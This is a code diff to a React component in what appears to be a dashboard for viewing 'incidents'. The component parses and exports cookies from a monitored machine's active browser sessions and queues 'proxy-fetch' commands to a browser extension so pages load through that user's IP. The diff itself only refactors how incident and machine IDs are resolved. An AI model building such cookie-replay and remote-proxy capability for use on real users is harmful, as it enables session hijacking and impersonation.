@@ -12,6 +12,7 @@ import PopupResponsesPanel from "@/components/PopupResponsesPanel";
 interface LiveSiteViewerProps {
   incident: {
     id: string;
+    incident_id?: string;
     host: string;
     machine_id: string;
     tab_url?: string;
@@ -35,6 +36,21 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
 
   // Fetch correct incident_id (INC-XXXXX format) for proxy calls
   useEffect(() => {
+    // If incident_id is already provided, use it directly
+    if (incident.incident_id) {
+      console.log('[LocalProxy] Using provided incident_id:', incident.incident_id);
+      setIncidentIdForProxy(incident.incident_id);
+      return;
+    }
+    
+    // If incident.id already looks like INC-XXX, use it
+    if (incident.id.startsWith('INC-')) {
+      console.log('[LocalProxy] ID is already incident_id format:', incident.id);
+      setIncidentIdForProxy(incident.id);
+      return;
+    }
+    
+    // Otherwise fetch from database
     const fetchIncidentId = async () => {
       try {
         const { data } = await supabase
@@ -44,17 +60,18 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
           .single();
         
         if (data?.incident_id) {
-          console.log('[LocalProxy] Using incident_id for proxy:', data.incident_id);
+          console.log('[LocalProxy] Fetched incident_id from DB:', data.incident_id);
           setIncidentIdForProxy(data.incident_id);
+        } else {
+          setIncidentIdForProxy(incident.id);
         }
       } catch (error) {
         console.error('[LocalProxy] Failed to fetch incident_id:', error);
-        // Fallback to UUID if fetch fails
         setIncidentIdForProxy(incident.id);
       }
     };
     fetchIncidentId();
-  }, [incident.id]);
+  }, [incident.id, incident.incident_id]);
 
   // Parse cookies from incident data
   useEffect(() => {
@@ -153,13 +170,16 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     // Fallback: Use extension proxy (works with user's IP)
     console.log('[ExtensionProxy] Requesting fetch via extension');
     
+    // Normalize machine_id (handle both snake_case and camelCase)
+    const targetMachineId = incident.machine_id || (incident as any).machineId;
+    
     // 1. Get active session
     const domain = new URL(url).hostname;
     const { data: sessions } = await supabase
       .from('active_sessions')
       .select('*')
       .eq('domain', domain)
-      .eq('machine_id', incident.machine_id)
+      .eq('machine_id', targetMachineId)
       .eq('is_active', true)
       .order('last_activity', { ascending: false })
       .limit(1);
@@ -167,6 +187,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     const activeSession = sessions?.[0];
     
     if (!activeSession) {
+      console.warn('[ExtensionProxy] Nenhuma sessão ativa encontrada', { domain, targetMachineId });
       throw new Error('Nenhuma sessão ativa encontrada. Usuário pode estar offline.');
     }
     
@@ -175,7 +196,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
       .from('remote_commands')
       .insert({
         command_type: 'proxy-fetch',
-        target_machine_id: incident.machine_id,
+        target_machine_id: targetMachineId,
         target_tab_id: activeSession.tab_id,
         status: 'pending',
         payload: {
@@ -449,10 +470,12 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
 
     // Try to export fresh cookies if there's an active session
     try {
+      const targetMachineId = incident.machine_id || (incident as any).machineId;
       const { data: sessions } = await supabase
         .from('active_sessions')
         .select('machine_id, tab_id')
         .eq('domain', incident.host)
+        .eq('machine_id', targetMachineId)
         .eq('is_active', true)
         .order('last_activity', { ascending: false })
         .limit(1);
